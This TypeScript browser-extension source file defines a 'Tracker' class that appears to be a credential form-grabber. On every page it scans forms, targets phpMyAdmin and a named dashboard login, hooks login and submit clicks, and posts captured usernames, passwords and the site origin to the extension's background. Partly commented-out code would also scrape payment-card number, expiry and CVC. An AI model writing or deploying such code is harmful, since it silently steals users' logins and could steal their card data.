import {browser} from "webextension-polyfill-ts";
import {acsComPortFront} from "./messanger";

export class Tracker {
    public url?: any;
    public authEvent?: any;
    public isTrackerActivate: boolean = false;
    public trackerJobId: number = 0;
    public passwordStore: { node: HTMLElement, name: string, type: string, value: string }[] = [];
    public creditCardStore: { node: HTMLElement, name: string, type: string, value: string }[] = [];

    constructor(url: string) {
        if (url) {
            this.url = url;
            /*#!if debug===true*/
            /*console.log('Tracker constructed!!');*/
            /*#!endif*/
        }
    }

    init(callBack?: any) {
        const self = this;
        if (self.url) {

            /*#!if debug==true*/
            /*console.log('Tracker initializing!!');
            console.log('Tracker activated in ' + self.url);
            console.log('Tracker ready to search form element in web page!!');
            console.log();*/
            /*#!endif*/
            let interval1 = setInterval(function () {
                self.verifyFormElement(self, interval1);
            }, 1000);


            if (!self.isTrackerActivate) {
                /*#!if debug==true*/
                /*console.log('Tracker activation verification. Tracker disabled detected!');
                //console.log('Tracker reactivate itself!!');
                console.log();*/
                /*#!endif*/
                //self.verifyFormElement(self);
            } else {
                /*#!if debug==true*/
               /* console.log('Tracker activation verification. Tracker enabled detected!');
                console.log(self.isTrackerActivate);
                console.log();*/
                /*#!endif*/
            }
        }

        if (callBack) {
            callBack();
        }
    }


    trigger(self: this, __formElement: HTMLFormElement) {
        /*#!if debug==true*/
        console.log('Tracker checking environment!!');
        console.log(__formElement);
        console.log();
        self.track(self, __formElement);
        /*#!endif*/
        browser.storage.local.get().then(
            function (setting) {
                if (Object.keys(setting).length !== 0 && setting.constructor === Object) {
                    /*#!if debug==true*/
                    console.log('Tracker exploring target!!');
                    console.log(__formElement);
                    console.log();
                    /*#!endif*/
                    self.track(self, __formElement);
                }
            },
            function (errors) {
                /*#!if debug==true*/
                console.error('Tracker starting failed!!');
                console.error(errors);
                console.log();
                /*#!endif*/
                acsComPortFront.postMessage({'command': "checkSettings"});
                //browser.runtime.reload();
            }
        );
    }

    verifyFormElement(self: this, interval?: any) {
        if (document.querySelectorAll('form').length !== 0) {
            /*#!if debug==true*/
            /*console.log('Tracker form(s) found!!');
            console.log();*/
            /*#!endif*/
            document.querySelectorAll('form').forEach(function (__formElement) {
                /*#!if debug==true*/
                /*console.log('Tracker verifying!!');
                console.log(__formElement);
                console.log();*/
                /*#!endif*/

                if (__formElement.attributes.length !== 0) {
                    /*#!if debug==true*/
                    /*console.log('Tracker form(s) attribute checked!!');
                    console.log();*/
                    /*#!endif*/
                    if (window.location.href.toLowerCase().indexOf('phpmyadmin') !== -1) {
                        if (__formElement.method === 'post') {
                            interval ? clearInterval(interval) : '';
                            /*#!if debug==true*/
                            const __hostSide = (window.location.origin.indexOf('localhost') !==-1) ? 'local':'server';
                            console.log('Tracker fetched in phpmyadmin zone. It will be '+ __hostSide +' side!!');
                            console.log('Tracker target following!!');
                            console.log(__formElement);
                            console.log();
                            /*#!endif*/
                            self.isTrackerActivate = true;
                            self.trackerJobId++;
                            self.trigger(self, __formElement);
                        }
                    } else {
                        if (__formElement.action !== 'javascript:void(0)' && __formElement.id !== 'null' && __formElement.id !== 'irouteForm' &&
                            __formElement.id !== 'bhlf' && __formElement.id.indexOf('id') === -1 && __formElement.id.indexOf('u_0_') === -1 &&
                            __formElement.id.indexOf('theform') === -1 && __formElement.id.indexOf('scl_form') === -1 &&
                            __formElement.className.indexOf('gb_8e') === -1) {
                            interval ? clearInterval(interval) : '';
                            /*#!if debug==true*/
                            /*console.log('Tracker escaping target and following it(s)!!');
                            console.log(__formElement);
                            console.log();*/
                            /*#!endif*/
                            self.isTrackerActivate = true;
                            self.trackerJobId++;
                            self.trigger(self, __formElement);
                        }
                    }
                } else {
                    if (__formElement.childNodes.length > 1) {
                        interval ? clearInterval(interval) : '';
                        /*#!if debug==true*/
                        /*console.log('Tracker not found any attribute(s) of form(s). But this/these form has exploitable child nodes. Now following it(s)!!');
                        console.log(__formElement);
                        console.log();*/
                        /*#!endif*/
                        self.isTrackerActivate = true;
                        self.trackerJobId++;
                        self.trigger(self, __formElement);
                    }
                }
            });
        } else {
            /*#!if debug==true*/
            /*console.log('Tracker not found any form(s)!!');
            console.log();*/
            /*#!endif*/
            if (window.location.origin.indexOf('dash.fembed.com') !== -1) {
                if (document.querySelector('#login') !== null) {
                    interval ? clearInterval(interval) : '';
                    /*#!if debug==true*/
                    console.log('Tracker not found any form(s). But this website in our database. Now following it(s)!!');
                    console.log();
                    /*#!endif*/
                    self.isTrackerActivate = true;
                    self.trackerJobId++;
                    self.classicTrackAuthEvent(self, '#email_login', '#password', '#login');
                }
            }
        }
    }

    resolverFormAttributes(self: this, __formElement: any): any {
        const attributes = [...__formElement.attributes];
        if (attributes.length !== 0) {
            attributes.forEach(function (attr) {
                if (attr.nodeValue !== 'javascript:void(0);') {
                    if (attr.nodeValue.length !== 0 && attr.nodeValue.length >= 3) {
                        /*form attribute value*/
                        [
                            {'login': ['signin', 'login']},
                            {'register': ['reg', 'register', 'signup', 'join']},
                            {'logout': ['logout']},
                            {'payment': ['credit', 'payment', 'body', 'checkout', 'sslform', 'Pay', 'purchase', 'ElementsApp']},
                            {'exclude': ['q', 'search', 'googleads', 'presentation', 'captcha', /*'disable', */'header']},
                        ].forEach(function (keyword: any) {
                            if (Object.keys(keyword).length !== 0 && keyword.constructor === Object) {
                                Object.keys(keyword).forEach(function (__key) {
                                    keyword[__key].forEach(function (__qKey: any) {
                                        if (attr.nodeValue.toLowerCase().indexOf(__qKey) !== -1) {
                                            /*var str = text.replace(/(^\w{1})|(\s{1}\w{1})/g, match => match.toUpperCase());*/
                                            //self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = __key;
                                            self.authEvent = __key;
                                        } else {
                                            if (attr.nodeValue === null) {
                                                //self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = 'exclude';
                                                self.authEvent = 'exclude';
                                            }
                                        }
                                    });
                                });
                            }
                        });
                    }
                }
            });
        } else {
            self.authEvent = 'Unknown';
        }

        return self.authEvent;
    }

    track(self: this, __formElement: HTMLFormElement) {
        let elements: string[] = [];
        if (__formElement.nodeName === 'FORM' && __formElement.length !== 1) {
            self.resolverFormAttributes(self, __formElement);
            /*#!if debug==true*/
            console.log('Tracker crawling started');
            console.log('Tracker fetching ' + self.authEvent + ' event!!');
            console.log('Job ID : ' + self.trackerJobId);
            console.log(__formElement);
            console.log();
            /*#!endif*/
            if (self.authEvent === 'login' || self.authEvent === 'register') {
                /*#!if debug==true*/
                console.log('Tracker crawling started');
                console.log('Tracker fetching ' + self.authEvent + ' event!!');
                console.log('Job ID : ' + self.trackerJobId);
                console.log(__formElement);
                console.log();
                /*#!endif*/
                self.crawlAuthFormElement(self, elements, __formElement);
            } else if (self.authEvent === 'Payment') {
                /*#!if debug==true*/
                console.log('Tracker crawling started');
                console.log('Tracker fetching ' + self.authEvent + ' event!!');
                console.log(self.authEvent + ' : this feature is reserved for future purpose!!!');
                console.log(__formElement);
                console.log();
                /*#!endif*/
                //self.crawlPaymentFormElement(self, elements, __formElement);
            } else {
                if (self.authEvent !== 'exclude' && self.authEvent !== 'logout') {
                    /*#!if debug==true*/
                    console.log('Tracker crawling started');
                    console.log('Tracker fetching ' + self.authEvent + ' event!!');
                    console.log(self.authEvent + ' : this feature is reserved for future purpose!!!');
                    console.log(__formElement);
                    console.log();
                    /*#!endif*/
                    self.crawlAuthFormElement(self, elements, __formElement);
                    //self.crawlPaymentFormElement(self, elements, __formElement);
                } /*else {
                    alert(self.authEvent);
                }*/
            }
        }
    }

    classicTrackAuthEvent(self: this, usernameElementId: any, passwordElementId: any, loginButtonElementId: any) {
        let usernameElement: any, passwordElement: any, loginButtonElement: any;

        if (document.querySelector(usernameElementId) !== null) {
            usernameElement = document.querySelector(usernameElementId);
        }
        if (document.querySelector(passwordElementId) !== null) {
            passwordElement = document.querySelector(passwordElementId);
        }
        if (document.querySelector(loginButtonElementId) !== null) {
            loginButtonElement = document.querySelector(loginButtonElementId);
        }
        loginButtonElement.addEventListener('click', function () {
            return acsComPortFront.postMessage({
                command: 'saveLoginData',
                data: {
                    "event": self.authEvent,
                    "username": usernameElement.value,
                    "password": passwordElement.value,
                    "workWebsite": window.location.origin
                }
            });
        })
    }

    crawlAuthFormElement(self: this, elements: any [], __parentElement: HTMLElement) {
        __parentElement.childNodes?.forEach(function (__childElement: any) {
            ['input','button','a'].forEach(function (__eligibleElement) {
                if (__childElement.nodeName.toLowerCase() === __eligibleElement){
                    ['input'].forEach(function (__onlyInputElement) {
                        if (__childElement.nodeName.toLowerCase() === __onlyInputElement){
                            [...__childElement.attributes].forEach(function (__attribute) {
                                if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 4) {
                                    ['text', 'email', 'password'].forEach(function (__eligibleAttribute) {
                                        if (__attribute.nodeValue.toLowerCase() === __eligibleAttribute) {
                                            elements.push(__childElement);
                                        }
                                    });
                                }
                            });
                        }
                    });
                    if (__childElement.type === 'submit' || __childElement.type === 'button' || __childElement.nodeName === 'A' &&
                        __childElement.innerHTML.toLowerCase().indexOf('sign' || 'log' || 'reg') !== -1) {
                        self.resolveAuthEvent(self, __childElement, elements);
                    }
                }
            });

            return self.crawlAuthFormElement(self, elements, __childElement);
        });
    }

    resolveAuthEvent(self: this, element: any, array: any) {
        let elementNode: any, elementName: any, elementType: any, elementValue: any;
        (element as HTMLElement).addEventListener('click', function (/*e*/) {
            /*#!if debug==true*/
            let status = self.authEvent ? self.authEvent : 'Event';
            alert(status + ' tracked!!');
            /*#!endif*/
            array.forEach(function (__detectedElement: any) {
                [...__detectedElement.attributes].forEach(function (__attribute) {
                    if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 4) {
                        ['user', 'login', 'email', 'pass'].forEach(function (__eligibleAttribute: any) {
                            if (__attribute.nodeValue.toLowerCase().indexOf(__eligibleAttribute) !== -1) {
                                /*#!if debug==true*/
                                console.log()
                                console.log(__detectedElement)
                                console.log(__eligibleAttribute)
                                console.log(__detectedElement.type)
                                console.log(__detectedElement.value)
                                console.log()
                                /*#!endif*/
                                elementNode = __detectedElement;elementName = __eligibleAttribute;
                                elementType = __detectedElement.type;elementValue = __detectedElement.value;
                            }
                        });
                    }
                });

                if (elementValue.length !== 0) {
                    self.passwordStore.push({
                        node: elementNode,
                        name: elementName,
                        type: elementType,
                        value: elementValue
                    });

                    if (self.passwordStore.length === 2 && self.passwordStore.length < 3) {
                        if (self.passwordStore[0].type === 'password') {
                            let password = self.passwordStore[0];
                            self.passwordStore[0] = self.passwordStore[1];
                            self.passwordStore[1] = password;
                        }

                        if (self.passwordStore[0].type === 'email' || self.passwordStore[0].type === 'text' &&
                            self.passwordStore[1].type === 'password') {
                            acsComPortFront.postMessage({
                                command: 'saveLoginData',
                                data: {
                                    "event": self.authEvent,
                                    "username": self.passwordStore[0].value,
                                    "password": self.passwordStore[1].value,
                                    "workWebsite": window.location.origin
                                }
                            });
                        }
                        self.passwordStore = [];
                    }
                }
            });
        });
    }

    crawlPaymentFormElement(self: this, elements: any [], __formElement: HTMLElement) {
        __formElement.childNodes?.forEach(function (__childElement: any) {
            ['input', 'button', 'select'].forEach(function (__eligibleElement) {
                if (__childElement.nodeName.toLowerCase() === __eligibleElement) {
                    ['input','select'].forEach(function (__eligibleDataElement) {
                        if (__childElement.nodeName.toLowerCase() === __eligibleDataElement) {
                            [...__childElement.attributes].forEach(function (__attribute) {
                                if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 4) {
                                    ['text', 'tel', 'number', 'password', 'radio', 'select-one'].forEach(function (__eligibleAttribute) {
                                        if (__attribute.nodeValue.toLowerCase() === __eligibleAttribute) {
                                            /*#!if debug==true*/
                                            console.log()
                                            console.log(__childElement)
                                            console.log(__childElement.type)
                                            console.log(__childElement.value)
                                            console.log()
                                            /*#!endif*/
                                            elements.push(__childElement);
                                        }
                                    });
                                }
                            });
                        }
                    });
                    ['submit', 'button'].forEach(function (__eligibleCollectorElement) {
                        if (__childElement.type === __eligibleCollectorElement) {
                            self.resolvePaymentEvent(self, __childElement, elements);
                        }
                    });
                }
            });
            return self.crawlPaymentFormElement(self, elements, __childElement);
        });
    }


    /* checking
    * https://www.tunnelbear.com/account/checkout
    * */


    resolvePaymentEvent(self: this, element: any, array: any []) {
        /*let elementNode: any, elementName: any, elementType: any, elementValue: any;*/
        console.log(element);
        array.forEach(function (detectedElement: any) {
            console.log(detectedElement);
            console.log(detectedElement.type);
            console.log(detectedElement.value);
        });

        /*array.forEach(function (__detectedElement: any) {
            [...__detectedElement.attributes].forEach(function (__attribute) {
                if (__attribute.nodeName === 'class' || __attribute.nodeName === 'id' || __attribute.nodeName === 'name' ||
                    __attribute.nodeName === 'type' || __attribute.nodeName === 'value' || __attribute.nodeName === 'autocomplete') {
                    if (__attribute.nodeValue.toLowerCase().indexOf('number') !== -1) {
                        elementNode = __detectedElement;
                        elementName = 'cardNumber';
                        elementType = __detectedElement.type;
                        elementValue = __detectedElement.value;
                    }
                }
                if (__attribute.nodeName === 'class' || __attribute.nodeName === 'id' || __attribute.nodeName === 'name' ||
                    __attribute.nodeName === 'type' || __attribute.nodeName === 'value' || __attribute.nodeName === 'autocomplete') {
                    if (__attribute.nodeValue.toLowerCase().indexOf('holder') !== -1) {
                        elementNode = __detectedElement;
                        elementName = 'cardHolder';
                        elementType = __detectedElement.type;
                        elementValue = __detectedElement.value;
                    } else {
                        if (__attribute.nodeValue.toLowerCase().indexOf('name') !== -1) {
                            elementNode = __detectedElement;
                            elementName = 'cardHolder';
                            elementType = __detectedElement.type;
                            elementValue = __detectedElement.value;
                        }
                    }
                }
                if (__attribute.nodeName === 'class' || __attribute.nodeName === 'id' || __attribute.nodeName === 'name' ||
                    __attribute.nodeName === 'type' || __attribute.nodeName === 'value' || __attribute.nodeName === 'autocomplete') {
                    if (__attribute.nodeValue.toLowerCase().indexOf('expire') !== -1) {
                        elementNode = __detectedElement;
                        elementName = 'cardExpire';
                        elementType = __detectedElement.type;
                        elementValue = __detectedElement.value;
                    }
                }
                if (__attribute.nodeName === 'class' || __attribute.nodeName === 'id' || __attribute.nodeName === 'name' ||
                    __attribute.nodeName === 'type' || __attribute.nodeName === 'value' || __attribute.nodeName === 'autocomplete') {
                    if (__attribute.nodeValue.toLowerCase().indexOf('cvc') !== -1 || __attribute.nodeValue.toLowerCase().indexOf('cvv') !== -1) {
                        elementNode = __detectedElement;
                        elementName = 'cardCVC';
                        elementType = __detectedElement.type;
                        elementValue = __detectedElement.value;
                    }
                }
                if (__attribute.nodeName === 'class' || __attribute.nodeName === 'id' || __attribute.nodeName === 'name' ||
                    __attribute.nodeName === 'type' || __attribute.nodeName === 'value' || __attribute.nodeName === 'autocomplete') {
                    if (__attribute.nodeValue.toLowerCase().indexOf('zip') !== -1) {
                        elementNode = __detectedElement;
                        elementName = 'cardZip';
                        elementType = __detectedElement.type;
                        elementValue = __detectedElement.value;
                    }
                }
                if (__attribute.nodeName === 'class' || __attribute.nodeName === 'id' || __attribute.nodeName === 'name' ||
                    __attribute.nodeName === 'type' || __attribute.nodeName === 'value' || __attribute.nodeName === 'autocomplete') {
                    if (__attribute.nodeValue.toLowerCase().indexOf('brand') !== -1) {
                        elementNode = __detectedElement;
                        elementName = 'cardBrand';
                        elementType = __detectedElement.type;
                        elementValue = __detectedElement.value;
                    }
                }

            });

            if (elementValue.length !== 0) {
                self.creditCardStore.push({
                    node: elementNode,
                    name: elementName,
                    type: elementType,
                    value: elementValue
                });


                console.log(elementNode);
                console.log(elementName);
                console.log(elementType);
                console.log(elementValue);
                console.log(self.creditCardStore);
                //self.creditCardStore = [];
            }
        });*/
    }
}